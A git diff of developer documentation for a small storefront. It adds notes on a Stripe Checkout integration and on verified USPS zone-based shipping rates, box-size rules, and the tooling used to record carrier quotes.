@@ -16,6 +16,12 @@ Static site, no build step, no dependencies. At the repo root:
 - `fonts/` — self-hosted woff2 + `fonts.css`; `images/` — product photos
 - [styles.css](styles.css) — all styling, dark theme, CSS custom properties in `:root`
 - [server.py](server.py) — stdlib-only dev server + tiny JSON API
+- [stripe_client.py](stripe_client.py) — Stripe Checkout over urllib; no SDK, no dependency
+- [STRIPE.md](STRIPE.md) — payment setup, the manual test script, and the go-live checklist
+- `tests/` — stdlib `unittest`, no credentials needed: `test_stripe_checkout.py` (39) and
+  `test_shipping_weights.py` (13 — category weights *and* the rate table). Run both after touching
+  pricing, shipping or payments. The Stripe suite covers the shapes a declined card and a 3DS card
+  make on the server, and checks inventory is conserved across every ending an order can have.
 
 ## Running it
 
@@ -138,12 +144,89 @@ is authentic and that receipts are provided to buyers after purchase.
 | Footer / vouches | `initVouchFooter` | The site has exactly **one** footer, fixed to the bottom of the viewport, and it *is* the vouch rotator: one buyer quote at a time, swapped every `VOUCH_ROTATE_MS` (4s), with the brand/copyright line beneath. Quotes come verbatim from the Instagram reference post (`VOUCH_POST_URL`) — **never reword one**, since they are other people's words and editing turns a real quote into a fabricated one. Handles are stored **already masked** in `VOUCHES`: masking only at render would still ship the real usernames in the page source, which is not anonymity. The originals are on the public post. Rotation pauses on hover and while the tab is hidden; `body` carries a `padding-bottom` matching the footer height so content never runs underneath it. |
 | Newsletter signup | `initSignup` | Optional `#signup` section near the foot of the page, posting to `/api/subscribe`. **Nothing is gated behind it** — browsing, pricing, cart and checkout all work without it, and a failed POST just says so rather than blocking. Was a full-screen overlay at z-index 1000 that held the store hostage until an email was handed over; the email is now asked for once at checkout, where it is actually needed to send a confirmation. |
 | Cart | `loadCart` / `saveCart` | `localStorage["poc_cart"]` stores `[{name, size, qty}]`; a *line* is a product + chosen size + quantity, keyed by `lineId` (`name__size`), so two sizes of one style are two lines. `addToCart` tops up an existing line rather than refusing it, returning `"added"` / `"topped-up"` / `"maxed"`. The badge counts units, not lines. `loadCart` drops lines whose style or size has since left `PRODUCTS`. |
-| Checkout | `initCheckout` | **Reserves stock; no payment processor connected.** There are **no card fields at all** — the inputs and their card-number/expiry/CVC formatters were removed, because formatting a card number implies the site does something with it and it did not. The panel says so to the buyer ("Card payment isn't live yet"): the order is held 30 minutes and settled by DM. Only email/items/subtotal/shipping/total/weight/`ship_to` are POSTed. |
+| Checkout | `initCheckout` / `startStripeCheckout` | **Three flows now.** An order nothing can price shows no figure, reads *Quoted by us* / *$X + shipping*, and the button asks for a quote instead of payment — see the Shipping section. Otherwise: **two flows, chosen by the server.** With Stripe configured the button reads *Pay $X* and hands off to Stripe's hosted page; without it, the original reserve-and-DM flow. There are **no card fields either way** — hosted Checkout means card details never touch this site. Only email/items/`ship_to` are POSTed; every price is recomputed server-side. See the Payments section below. |
 | My Orders | `initOrders` | Email lookup, no accounts |
 | 3D tilt | `initTilt` | Any element with `class="tilt"` and optional `data-tilt-max` |
 
 `initTilt()` must be re-called after injecting new `.tilt` markup (`renderProducts` already does).
 Everything is wired up from a single `DOMContentLoaded` handler at the bottom of the file.
+
+## Payments (Stripe Checkout)
+
+**Test mode only, and not deployed.** Full setup, the manual test script and the go-live checklist
+are in [STRIPE.md](STRIPE.md); this is the part a future change has to not break.
+
+`python3 tools/stripe_preflight.py` reports what a given machine is missing — key, mode, webhook
+secret, return URL, payment columns — and prints the next step for each. It **never prints a
+secret** (keys are redacted to mode + last four), so its output is safe to paste into a chat or an
+issue, and it exits non-zero unless payments would really be enabled.
+
+`stripe_client.py` talks to Stripe's REST API with `urllib` rather than the `stripe` SDK, so the
+project keeps its zero-dependency promise. Form encoding, bracket notation for nested params and
+webhook signatures are all implemented there.
+
+**Payments are off unless a secret key AND a webhook secret are both present.** A half-configured
+install falls back to the reserve flow, deliberately: an order that can be paid but never confirmed
+is worse than one that cannot be paid at all, because the buyer is charged and the shop never
+ships. `is_configured()` is the single source of that answer, and `/api/payments/config` is how the
+front end learns it.
+
+**A live key is refused unless `POC_ALLOW_LIVE_PAYMENTS=1`.** Pasting a `sk_live_` key is not
+enough to start taking real money; someone has to set that variable on the server too. Keys are
+never logged whole — `redact()` shows the mode and the last four characters.
+
+Three rules the payment path depends on:
+
+- **The browser never sends a price.** `/api/checkout/session` accepts `name`/`size`/`qty` and
+  nothing else that touches money. `orders.create_order()` prices the basket from the database
+  ladder and the Checkout Session is built from *those* figures, so a tampered cart changes what is
+  ordered, never what it costs. There is a test that posts `price: 0.01` and asserts Stripe is
+  still told $21.00.
+- **The webhook marks an order paid, not the success page.** The buyer's return to
+  `?checkout=success` is cosmetic; `initCheckoutReturn()` asks `/api/checkout/status`, which reads
+  the order's real state. Typing that URL by hand proves nothing.
+- **A payment is only honoured when the amount matches.** `orders.amount_matches()` compares
+  `amount_total` and currency against the order before `mark_paid` runs. A mismatch is logged
+  loudly and the order is left pending — never fulfilled on the strength of the event alone.
+
+Idempotency is not reimplemented here: `payment_events` already keys on the provider's event id, so
+a redelivered webhook fails that insert and becomes a no-op inside `mark_paid` / `cancel_order` /
+`refund_order`. Stripe redelivers after any non-2xx and after an outage, so this matters — there is
+a test that replays an event and asserts stock does not move twice.
+
+**An unhandled event type returns 200, not an error.** A non-2xx makes Stripe retry for days.
+Genuine handler faults do return 500, because those *should* be retried. A payment arriving for an
+order that has left `pending` is in the first category, not the second — retrying can never make a
+cancelled order payable — so it returns 200 and logs instead. When that order was cancelled rather
+than already paid, the log is deliberately loud: Stripe collected money for stock the shop has
+released, and that needs a person, not a retry.
+
+**The Checkout Session is given an `expires_at` equal to `RESERVATION_TTL_SECONDS`.** A session is
+payable for 24 hours by default while the reservation lasts 30 minutes, so without it a buyer could
+pay most of a day later for units already back on the shelf and possibly resold — money taken,
+nothing to ship. The value is passed from the TTL rather than being a constant of its own, so the
+window a buyer can pay in and the window stock is held for cannot drift apart. Stripe refuses an
+`expires_at` under 30 minutes, which is why a shorter TTL is clamped rather than mirrored.
+
+`set_payment_intent()` is deliberately non-fatal. It only stores the id a later refund event needs;
+letting its unique-index violation raise would abort the handler before `mark_paid` ran, so Stripe
+would retry a payment that already succeeded and the order would never be marked paid. Money
+arriving matters more than an index being tidy.
+
+Copy moves with the flow. `applyPaymentCopy()` swaps the eyebrow, the notice, the trust-strip line,
+the button and the disclaimer together, because every one of them makes a promise that is false in
+the other mode — "no card details are collected" while Stripe collects them is the same kind of
+untrue claim that got "Encrypted checkout" removed. In test mode the panel says so in bold.
+
+**A manual quote is a third mode and obeys the same rule.** `setCheckoutShipping()` owns the
+button, the disclaimer and the notice while an order is being quoted by hand, and hands all three
+back to `applyPaymentCopy()` when it stops being one. Each of those three was a one-way switch at
+some point and each produced the same bug: a buyer who typed an unpriceable ZIP and corrected it
+kept a button reading "Request a shipping quote" on a form about to take payment, and the notice
+went on promising the order was held 30 minutes and to DM to settle up on an order the shop was
+going to email a price for. `applyPaymentCopy()`'s reserve branch therefore **writes** its fine
+print and its notice rather than leaving them to the markup — it is a restore path, not just an
+initialiser, and anything it does not write does not come back.
 
 ## Pricing
 
@@ -240,6 +323,23 @@ Rates are weight-based, configured in the "EDIT THIS: shipping" block at the top
 - `CATEGORY_WEIGHT_OZ` — per-category shipping weight. **These are estimates**, since the workbook
   carries no weights; a product can override with its own `weightOz`. Postage bills on real weight,
   so put the stock on a scale before going live.
+  **Its keys must match `categories` in products.json exactly, and it is mirrored in `db/orders.py`**
+  — the JS quotes the buyer, the Python charges the card. Renaming a category without renaming its
+  key here is silent: the lookup misses, `DEFAULT_WEIGHT_OZ` (8 oz) applies, and nothing complains,
+  because a missing key is indistinguishable from "no estimate yet". That happened — `ff30d32`
+  renamed T-Shirts→Shirts and Backpacks→Bags and both tables kept the old keys, so **every bag
+  shipped billed 8 oz instead of 32**, roughly $3.50–$4.00 of postage per order out of pocket.
+  `test_pricing_parity` did not catch it because both copies were wrong in the same way;
+  `tests/test_shipping_weights.py` now checks the keys against the real category list as well as
+  against each other, and fails on a dead key, a missing one, or the two files disagreeing.
+- `SHIPPING_TIERS` gets the same treatment in that file: band edges must land on whole pounds
+  (USPS bills at the rounded-up pound, so an edge anywhere else splits one carrier price into two
+  of ours), bands must ascend in weight and price, postage must never fall as weight rises, and the
+  JS and Python tables must match. Which pounds have no band at all is recorded in
+  `KNOWN_MISSING_POUNDS` and checked both ways, so closing the gap is a deliberate edit rather than
+  something nobody writes down. That file loads `db/orders.py` **from source, not through
+  `__pycache__`** — a .pyc is validated on (mtime, size), and a same-length edit in the same second
+  is served from cache, which had the tests checking bytecode instead of the file on disk.
 - `PACKAGING_OZ` — mailer/padding, added once per order.
 - `SHIPPING_TIERS` — cheapest-first bands; the first one the order's total weight fits under wins,
   falling back to `SHIPPING_OVER_MAX`. The first band is flat for everything under 1 lb because the
@@ -251,6 +351,342 @@ with quotes from Pirate Ship's calculator for the zones actually shipped to.
 
 `shippingFor(lines)` and `orderWeightOz(lines)` drive the cart, the checkout panel, and the stored
 order. Format money with `money(n)` so everything reads as two decimals.
+
+**Zone pricing: estimate in the cart, real rate at checkout.** Ground Advantage is priced on weight
+AND zone, but the cart has no address — so the cart is labelled *Estimated shipping* and prices off
+the flat ladder, and the checkout panel replaces that figure once a ZIP is entered. The checkout
+figure comes from `POST /api/shipping/quote`, i.e. **from the server**, computed by the same
+`orders.quote()` that prices the order and builds the Stripe session. There is deliberately no
+second implementation in the browser: that is how a displayed figure and a charged one drift apart.
+`setCheckoutShipping()` is the single writer for the shipping line, the total and the button
+amount, so those three can never disagree on screen.
+
+**Verification is per cell, and the fallback is a person — not the flat ladder.** An order is
+either charged a rate somebody read off the screen, or handed to a human for a quote. There is no
+third answer, and in particular the `SHIPPING_TIERS` ladder never reaches the checkout panel: those
+are national-average placeholders nobody obtained, and presenting one as the charged price is the
+drift this codebase refuses everywhere else. The cart still shows them, labelled *Estimated*,
+because a cart has no address.
+
+That is what replaced the old all-or-nothing `zone_pricing_ready()` gate. It demanded all 36 cells
+before any order could be priced, and the reasoning was sound *given its fallback*: a half-filled
+table plus a placeholder ladder prices two identical baskets by different rules depending on which
+cell happened to be filled. Swap the fallback for a human and the objection disappears — so a
+half-filled table is safe to launch on, and the shop sells while the rest is collected.
+
+- `zone_cell_usable()` is the remaining table-wide gate: a non-empty `zone_map`,
+  `rate_table_problems()` empty, a measured box, a ceiling. It no longer requires completeness.
+- `cell_is_verified(section, band, group)` governs each cell: filled **and** backed by a
+  `cell_provenance` entry on this table's own service and rate basis.
+- `zone_rate_cents()` skips unverified cells and takes the cheapest verified band **at or above**
+  the parcel's own. So an unquoted band falls UP to the next one quoted, never down onto a made-up
+  number, and a group prices from zero up to its heaviest verified band — one number describes a
+  whole column's coverage, which is what `priced_ceiling_oz()` returns.
+
+`zone_pricing_ready()` still exists and still means "every required cell is verified". It is a
+reporting figure now, not a switch.
+
+**`shipping_quote(lines, dest_zip)` is the whole decision: the figure, which rule produced it, and
+the reason.** One function, because the price and a separate "which rule applied" helper were two
+implementations of the same decision and they drifted — the helper still reported `estimate` for a
+destination the pricer had already sent to a human, so the panel would have shown an estimate for
+an order nothing could price. `shipping_cents()` is a thin wrapper on it; the old
+`shipping_source()` is gone.
+
+Three things send an order to a human, and the reason has to name the right one, because the buyer
+reads it: **too heavy** for the table (over `max_quotable_oz`), **too bulky** for the box the rates
+were quoted in (`exceeds_standard_box()`), or **no verified cell** for that band and zone group.
+Telling a 7.5 lb order it is over 31 lb is a claim the page is making up.
+
+**A manual-quote order holds stock, so it has to expire.** `MANUAL_QUOTE_TTL_SECONDS` is 48 hours,
+against 30 minutes for a card order: a buyer waiting on a person is not on the payment clock, but
+"waiting on a person" with no clock at all means one abandoned bulk enquiry holds twenty shirts out
+of the catalogue forever, with nothing on the site to say why they are unbuyable.
+`expire_pending()` sweeps both statuses in one pass and releases stock the same way, and the log
+note says which clock ran out.
+
+**The status is `quote_requested` and `shipping_cents` is 0 with `shipping_pending = 1`.** The
+column is `NOT NULL` and a table rebuild to widen it cannot run under this migration model, which
+is additive and idempotent on every boot — so the zero stays and the flag says it is a placeholder.
+**Every path that renders a price has to ask**, because "$0.00" tells the buyer shipping was free.
+`store.shipping_pending()` is the single definition, and it lives in `db/store.py` next to the
+query that builds those rows: it used to live in `server.py`, where `store.order_by_ref()` — the
+buyer's own My Orders lookup — had no way to reach it and quietly rendered the zero.
+
+**Bulk is not only a weight problem, so volume is checked too.** Three pairs of shoes weigh 7.5 lb
+— inside every band the table prices — while filling more than the box every rate was quoted in,
+and a box over 1 cu ft bills on volume to three of the four zone groups. `assumed_unit_cu_in` in
+`shipping_rates.json` is **assumed, never measured, and deliberately generous**: over-estimating
+sends an order to a manual quote that might have fitted, which costs one email, while
+under-estimating prices a parcel needing a bigger box off the standard ladder, which is an
+undercharge the shop absorbs on every such order. The failure direction is chosen.
+
+**The table's box is a CONSTRAINT, not a specific carton** — "at or under 1 cu ft, no side over
+22 in", recorded as `kind: "constraint"` and verified as such. That is not a dodge around measuring:
+below 1 cu ft dimensions do not affect a weight-based rate at all, established by quoting 2 lb to
+90210 in a 0.40 cu ft box and a 0.92 cu ft box and getting $6.03 both times. So every rate is valid
+for any box inside the constraint, and which one the shop reaches for cannot change the price. What
+must hold is that orders stay inside it, and `exceeds_standard_box()` enforces that per order
+rather than trusting it.
+
+**How many more quotes are required to launch: zero.** `coverage_report()` ranks what is left by
+what it would buy rather than listing it as a wall, weighting each group by its share of the zone
+map. `python3 tools/shipping_gaps.py` prints it, and `record_quote.py --next` leads with the one
+session worth taking. Today all three mainland groups — `near`, `mid` and `far`, 99.9% of mapped
+prefixes — price every band from a single piece to 9 lb. Only `territories` (prefix 969, 0.1%) has
+no rate. Anything above 9 lb, or too bulky for the standard box, is quoted by hand.
+
+**A cheaper line on the screen is not a cheaper rate for this table.** The 6 lb and 9 lb far quotes
+both had a UPS Ground Saver line under the USPS one — $17.02 against $17.12, and $19.85 against
+$19.95. Neither is usable: the table is one carrier, one service, one rate basis, and a UPS price
+filed as USPS is one of the faults `record_quote.py` exists to catch. The cheapest **eligible** line
+is what fills a cell, and the rest go into `all_lines_seen` so the choice is auditable — a row whose
+only line is ineligible is refused outright, naming the service it got and the one the table holds.
+
+**Do not use a real ZIP as a test fixture for "nothing can price this".** Nine tests used 10001 —
+a genuine far-zone ZIP that merely had no cell yet — and the moment the far column was quoted they
+all started asserting a manual quote on an order the server had just priced. A fixture for
+unpriceable has to be **an unmapped three-digit prefix** (`UNPRICEABLE_ZIP = "34399"`), which can
+never become priceable because a zone is never inferred from distance, and each test asserts that
+premise so a change to the map says so rather than passing for the wrong reason.
+
+**The table is one carrier, one service, one rate basis.** `carrier` / `service` / `rate_basis` are
+separate fields because "USPS Ground Advantage" as a single string could not express the distinction
+that actually bit: **Ground Advantage Cubic is a different product**, priced on the box's volume in
+0.1 cu ft increments and flat across weight up to 20 lb (max 22 in any dimension, 1.0 cu ft, 20 lb).
+Pirate Ship rate shops Cubic against weight-based automatically and shows whichever is cheaper, so
+cubic prices arrive without anyone asking for them — that is where seven quotes at a flat $5.93
+across 3–9 lb came from. A volume-priced figure in a weight-indexed band is not a slightly-wrong
+price, it is a price for a different variable. See [SHIPPING.md](SHIPPING.md) for what that means for
+the whole table's shape.
+
+**"These cells must stay empty" is the wrong shape of guard.** A test froze near's 6-9 lb cells
+empty because they had once been filled from flat $8.56 Cubic quotes with no box measured. That was
+right at the time and it started failing the moment those bands were genuinely quoted — an
+emptiness assertion cannot tell a bad fill from a good one. The invariant that actually holds as
+the table fills is **every filled cell is weight-based**, checked per cell against the table's own
+`rate_basis` and service, with the original $8.56/$5.93 figures named separately so they can never
+reappear. The runtime enforces it independently of any test: a cell whose provenance says `volume`
+fails `cell_is_verified()` and the order falls up to the next honest band.
+
+**`rate_table_problems()` rejects a table that cannot be right**: postage falling as weight rises
+(the exact shape a cubic quote makes next to a weight-based one), a nearer zone costing more than a
+further one, or an over-max fallback undercutting the band it backs up. Nothing caught any of this
+before — a 2 lb cell at $9.15 sat above 3, 4 and 5 lb cells at $5.93 and the code was happy.
+
+**An unquoted pound rounds UP into the table, never out of it.** `zone_rate_cents()` walks
+`table_bands()` for the cheapest band at or above the parcel's billable pound. It used to look up
+the exact band and, finding none, drop straight to `over_max` — the fallback for parcels heavier than
+the whole table and the dearest cell in it. Bands 1, 10, 12, 14 and 15 have no row, so a 10 lb order
+paid the over-max price while an 11 lb order paid the 11 lb rate, and a parcel of exactly 16.0 oz
+paid it too.
+
+**A zone is never inferred from distance.** `zone_for_zip()` reads `zone_map`, keyed on the
+destination's first three digits. USPS publishes the chart per origin; mileage only approximates
+it. An unmapped prefix returns None and falls back to the estimate rather than borrowing a
+neighbouring zone's price.
+
+**Cubic does not take over the outer zones — that worry is refuted.** A model where Cubic wins
+from 2 lb up at zone 6 fitted the first three figures exactly, and predicted that every weight from
+2 to 20 lb in the test box would return the same $8.17. It did not: 5 lb came back $10.35 and 10 lb
+$16.51. The 12 × 12 × 11 box works at zone 6 as it does at zone 4, and the weight-based column is
+collectible for mid, far and territories after all.
+
+**Dimensions do not affect the rate below 1 cu ft — and do above it, in ways this table cannot
+express.** `billed_oz()` implements the rule: under 1,728 cu in a parcel bills on actual weight at
+any weight, which is exactly why quoting in a 12 × 12 × 11 test box is legitimate. Above it, and
+**only to zones 5–9 — mid, far and territories, three of the four groups** — it bills on
+`max(actual, volume / 139)`. Above 2 cu ft there is a flat **$21**, and a side over 22 in adds
+**$4.50**; `parcel_surcharge_cents()` covers both. The counter-intuitive part: at exactly 1 cu ft
+the dimensional weight is already **12.4 lb**, so crossing it punishes *light, bulky* parcels
+hardest — a 30 lb parcel can cross it and still bill on actual weight. Every order is safe in a box
+of 1 cu ft or less, whatever it weighs.
+
+**An order too heavy to price gets a manual quote — it is never blocked and never guessed at.**
+Above `max_quotable_oz` (31 lb) an order needs the large box, which bills on volume rather than
+weight and adds $25.50 in fixed fees; no weight-indexed ladder can price that. `needs_manual_quote()`
+flags it, `shipping_cents()` returns **None rather than a number**, and `quote()` carries
+`needs_manual_quote` plus a reason written in the buyer's terms. The order is still placed and still
+holds its stock — it simply has no total yet, and Stripe checkout refuses it rather than being
+handed a None amount.
+
+`MANUAL_QUOTE_OVER_OZ` in `script.js` **mirrors `max_quotable_oz`**, with a parity test, the same
+rule as the weight tables. `setCheckoutShipping()` is still the single writer and now has a third
+mode: it shows *"Quoted by us"* and *"$X + shipping"* rather than a figure it does not have, and
+the pay button asks for a quote instead of showing an amount nobody computed. Every call site must
+pass the mode; a test fails if one cannot express it.
+
+**Storage: `shipping_cents` is NOT NULL and this migration runner is additive and idempotent on
+every boot**, so widening the column would need a table rebuild that cannot run that way. Migration
+`005` adds `shipping_pending` instead: the zero stays to satisfy the constraint and the flag says it
+is a placeholder. **Every path that renders a price must check it** — `$0.00` tells the buyer
+shipping was free, which is the one wrong answer worse than no answer. `_pending()` in `server.py`
+tolerates a row from before the migration, since `sqlite3.Row` has no `.get`.
+
+**A table box must be at most 1 cu ft (1,728 cu in), and the binding band is the LIGHTEST one.**
+`packaging_problem()` measures the largest table box against `max_exact_cu_in()` of the lightest
+required band, not against the ceiling. An earlier version compared it to the 31 lb ceiling and so
+passed a 1.84 cu ft candidate box: its dimensional weight is 22.9 lb, comfortably under 31, while
+undercharging every band from a single tee up to 20 lb. **The undercharge lives at the light end.**
+The 20.5 × 15.5 × 10 box fails for exactly that reason — it clears the 2 cu ft and 22 in limits but
+bills as 22.9 lb to mid, far and territories whatever it holds, so a single-tee order to New York
+would be charged $6.07 against a real cost of at least $15.84. Near is unaffected, since dimensional
+weight never applies to zones 1–4.
+
+**`packaging_problem()` gates go-live on a measured box.** Nothing in `packaging.boxes` counts until
+`verified` is true, meaning someone put a tape measure on it. Without one, every rate silently
+assumes the real parcel stays under 1 cu ft. Both failure modes above are **undercharges**, and an
+undercharge comes out of the shop on every order — the one direction the round-up rule does not
+protect against.
+
+**Multi-package orders are not supported**, and `multi_package.supported` says so rather than the
+gap being silently absent. It breaks at four layers: `shipping_cents(lines)` sums to one weight and
+returns one price, `quote()` returns a single `weight_oz`, the orders table has one `weight_oz`
+column, and `/api/labels.csv` emits one row with one weight per order. Two parcels cost two labels
+and the table would charge for one. Whether it needs building depends on whether the largest real
+box holds the deepest advertised bulk tier — a measurement, not a judgement.
+
+**Box size does not affect weight-based Ground Advantage pricing** — verified, not assumed: 2 lb
+to 90210 returned $6.03 in a 12x19x3 box (0.40 cu ft) and $6.03 in a 12x12x11 box (0.92 cu ft), two
+different Cubic tiers. So the weight-based columns can be quoted in any convenient box and need no
+packaging decision; only the Cubic bands depend on the package. Keep using **12 × 12 × 11** for
+quoting: at 0.92 cu ft it forces Cubic into its dearest tier so the weight-based line is the one
+shown, while staying under every surcharge threshold.
+
+**Collect a whole column with `--session`, not one command at a time.** The file sets `dest` and
+`box` once, then one row per weight with every service line comma-separated:
+
+```
+dest 98101
+box 12x12x11
+8    USPS/Ground Advantage/6.40, USPS/Ground Advantage Cubic/8.90
+32   USPS/Ground Advantage/7.10, USPS/Ground Advantage Cubic/8.90
+```
+
+Rows are validated **against each other as well as against the file** — two rows can each be fine
+alone and jointly impossible — and **nothing is written unless every row passes**, the same
+all-or-nothing rule `apply_shipping_rates.py` uses. A column written with gaps looks complete and
+is not.
+
+**Never hand-enter a quote — use `python3 tools/record_quote.py`.** Every fault this table has
+had was findable at collection time and was instead found days later: a UPS price filed as USPS, a
+Cubic price filed as weight-based, a 2 lb rate above the 3 lb one, one figure carried across three
+pounds. The tool refuses a quote that cannot be right and names the rule broken — unmapped ZIP, a
+group quoted below its dearest zone, a service this table cannot hold, a package that triggers a
+USPS surcharge (>22 in is $4.50, >2 cu ft is $21, dimensional weight above 1728 cu in to zones 5–9
+at divisor 139), a price that breaks ladder monotonicity, or a disagreement with a cell already
+filled. `--next` prints what to collect and how; `--record` writes the cell and its provenance only
+if every check passes. **Record every service line on the screen, not just the one you would buy** —
+one number cannot be checked against anything, several diagnose themselves.
+
+**Pirate Ship shows only the winner of its own rate shopping.** Ground Advantage is one row, and
+behind it Weight-Based competes with Cubic. There is no toggle. Cubic gets *cheaper as volume falls*,
+so shrinking the box makes Cubic win harder — the instinct is backwards. To surface the weight-based
+line, quote in a box as close to 1.0 cu ft as possible **without** exceeding it: that puts Cubic at
+its dearest tier while staying under the 1728 cu in dimensional-weight threshold and the 22 in
+length fee. Disqualifying Cubic by going over either limit contaminates the price instead of
+revealing it.
+
+**The tariff is NOT monotonic, and that is verified, not a bad quote.** At zone 6 the 1 lb rate is
+$9.24 while 2 lb is $8.17 — both read off the screen with the weight field visible. USPS's published
+ladder never inverts (zero non-monotonic pairs across 100 rows of the rate sheet), but every visible
+row there is 21 lb or heavier; 1–20 lb is redacted, and those rows carry Pirate Ship's
+below-Commercial pricing. The discount is uneven between bands — 22.8% off at sub-1-lb against 4.0%
+at 1 lb — and a non-uniform discount on a monotonic list price inverts adjacent bands. It is a
+negotiated-rate artefact, and it is real. **My monotonicity rule was an assumption treated as a law
+and it rejected a correct quote three times.** It is now an acknowledged-exception rule: an inversion
+is still an error by default, since it is almost always a bad quote, but a verified pair goes in
+`verified_anomalies` with its evidence — `record_quote.py --anomaly "<evidence>"` writes both.
+
+**`zone_rate_cents()` charges the CHEAPEST rate at or above the parcel's band**, not its own band's.
+A shop may always declare a heavier weight than it ships, so the true cost of a 1 lb parcel to
+zone 6 is the 2 lb rate of $8.17. That is the real cost *and* the cheapest honest price for the
+buyer, and it makes the **charged** ladder monotonic even where the tariff is not. Operationally:
+when buying that label, declare 2 lb — $1.07 saved per parcel in that band.
+
+**A band must lie inside the bracket its filled neighbours impose**, and `record_quote.py` says so
+in those terms. Monotonicity catches the same faults but reports them as "band X is cheaper than
+band Y", which names one of the two and leaves you to work out which. A bracket is actionable: the
+1 lb zone 6 rate must be at least $6.07 and at most $8.17, so $9.24 is impossible **whatever $9.24
+turns out to be** — no theory about its origin required. Which of a conflicting pair to doubt is
+then settled on provenance, not preference.
+
+**A quote whose weight field was not visible on screen is never recorded**, however plausible the
+price looks. Two figures have now been wrong in exactly that condition — $7.03 reported as 2 lb but
+really the 5 lb rate, and $9.24 reported as 1 lb but really the 3 or 4 lb one — and both read as
+perfectly ordinary prices in isolation. Each was caught only because it landed on, or above, a band
+it could not belong to. The screenshot has to show the weight and the price together.
+
+**The discount off advertised is NOT uniform across bands.** The July 2026 change made sub-1-lb
+flat and cut it far harder than the pound bands, so a sub-1-lb cell sits ~22% below advertised while
+1 lb sits far less. A check that pooled every band into one expected discount refused a $9.24 quote
+at 1 lb zone 6 for being "only 4% off" — judged against sub-1-lb evidence it had nothing to do with.
+It reproduced exactly and was almost certainly correct. Only a verified cell in the **same band** is
+evidence about that band.
+
+**Quotes are checked against the published advertised rate.** `advertised_reference` in
+`shipping_rates.json` holds Pirate Ship's public sub-1-lb and 1 lb rates for all nine zones — the
+only rows not redacted in our weight range. They may **never** fill a cell; they are a ceiling. Both
+verified sub-1-lb cells sit ~22% below advertised, so `record_quote.py` refuses a price at or above
+advertised (impossible for a below-Commercial account) and one less than `MIN_PLAUSIBLE_DISCOUNT`
+(10%) below it. That caught a $9.24 quote at 1 lb zone 6 against $9.63 advertised — a 4% discount,
+the shape of a retail line — **on its own row**, where the monotonicity check needed a neighbouring
+band to contradict it and only fired after a whole session had been quoted.
+
+**The published Pirate Ship rate spreadsheet is not a source of rates.** Everything above 1 lb reads
+"Less than …" rather than a number, because they may not advertise below-Commercial pricing, and the
+whole Cubic sheet is redacted the same way. What it does print are advertised rates, not this
+account's — it lists 5–8 oz zone 4 at $7.46 where the real quote was $5.83. It is still worth
+reading: it independently confirms sub-1-lb is flat across 1–4/5–8/9–12/13–15.99 oz, gives the
+dimensional divisor as 139, and shows zone 8 and zone 9 at identical prices in both visible rows.
+
+**A three-digit prefix is not a place — check every destination with `--check <ZIP>` before
+quoting.** Birmingham AL is 352 (zone 7, far) and Tuscaloosa AL is 354 (zone 6, mid); they are an
+hour apart and fall either side of the mid/far line. Reading prefixes off the worklist and
+substituting a city you recognise is how a whole column gets quoted to the wrong zone, and the
+quoting is finished before anything notices. That happened. `--check` answers zone, group, whether
+it is that group's dearest zone, and what the group still needs — one command, before any quoting.
+
+**The zone map has been checked against an outside source once.** Pirate Ship independently
+reported zone 7 for 35203, matching the chart import exactly. Until then the map rested entirely on
+the PDF extraction.
+
+**A banded group must be quoted at its dearest zone** — near 4, mid 6, far 8, territories 9. One
+price covers the whole group, so quoting lower ships every order beyond it below cost, silently.
+`worst_case_zone()` derives this from `zone_map`, and `unverified_cells()` rejects a cell quoted
+below it.
+
+**Zone 9 is its own group, `territories`.** Prefix 969 — Guam, Palau, the FSM and the Marshall
+Islands, and the only zone 9 prefix in the chart — used to sit inside `far` alongside zones 7 and 8.
+One price per group meant a choice between charging the whole east coast a Pacific-territory rate
+and shipping every 969 order below cost. Splitting it lets zones 7–8 be quoted at zone 8, their real
+worst case, while 969 carries its own verified rate. `territories` is USPS's own label: the
+published chart heads that column "Territories" where the others read mileage bands.
+
+**The group list is DERIVED from `zone_groups`, never hardcoded.** `group_names()` in `db/orders.py`
+returns them ordered by lowest zone, so the "postage never falls as the destination gets further"
+check walks outward correctly. Four files used to carry `("near", "mid", "far")` as a literal —
+exactly the shape of the category-weight bug, where adding a group leaves copies quietly pricing
+three while the data describes four, and a missing key reads identically to "no rate yet". A test
+greps those files and fails on the literal.
+
+**`shipping_rates.json` is in `PRIVATE_FILES`.** The browser never reads it — the cart prices off the
+flat ladder and the checkout figure comes from `/api/shipping/quote` — so serving it is pure downside.
+It holds negotiated rates and the shipping origin ZIP. Note this stops the *storefront* serving it;
+the file is still tracked in a public repo by design, since it is the project's data.
+
+**Rate table or rate API?** [SHIPPING.md](SHIPPING.md) has the worked answer: **keep the table, fix
+the box, skip the API.** There is no Shippo integration in this repo and there should not be one yet.
+Pirate Ship rate shops weight-based Ground Advantage against Cubic and sells the winner, so the
+shop's real cost is `min(weight_based(lb), cubic(box))` — confirmed on screen, weight-based at 3–5 lb
+and Cubic from 6 lb up in the same box. For a **fixed** package that is still a function of weight
+alone, which is exactly what the existing table indexes on. So `rate_basis` becomes
+`cheapest_available`, `quoted_for_package` names one measured box, and each cell holds whichever
+service Pirate Ship showed cheapest — quote equals cost by construction, with no key, no dependency
+and no per-call billing. `package_problem()` refuses a rate-shopped table with estimated or missing
+dimensions, and `unverified_cells()` refuses a cell quoted for a different box. Shippo only becomes
+right if box size stops being standard; and if it is ever adopted, labels move there too, or the
+quote and the charge drift apart across a company boundary.
 
 ## Shipping labels (Pirate Ship)
 
@@ -410,6 +846,9 @@ without it, `orders.json` hands customer names, emails and shipping addresses to
 the URL. **Any new file holding customer data must be added to that set.** Reach order data through
 `/api/orders` (scoped to one email) or `/api/labels.csv`.
 
+`stripe_config.json` is in that set too. The webhook signing secret in it is as dangerous as the
+API key: anyone holding it can forge a "payment succeeded" event and have the shop ship for free.
+
 ## API (server.py)
 
 All responses are JSON; all writes are guarded by one global lock and persisted to gitignored JSON
@@ -421,17 +860,32 @@ files in the repo root (`clicks.json`, `bids.json`, `orders.json`, `subscribers.
 - `GET  /api/orders?email=` / `POST /api/order` — `{email, items, subtotal, shipping, total, weight_oz, ship_to}`, where `ship_to` is `{name, address1, address2, city, state, zip, country}` split into separate fields so the label CSV can map them
 - `GET  /api/labels.csv[?unshipped=1]` — Pirate Ship bulk-upload spreadsheet
 - `POST /api/subscribe` — `{email}`, newsletter signups from the `#signup` section
+- `GET  /api/payments/config` — `{payments_enabled, mode}`; one bit and a mode, never a key
+- `POST /api/checkout/session` — `{email, ship_to, items:[{name,size,qty}]}` → a Stripe Checkout URL
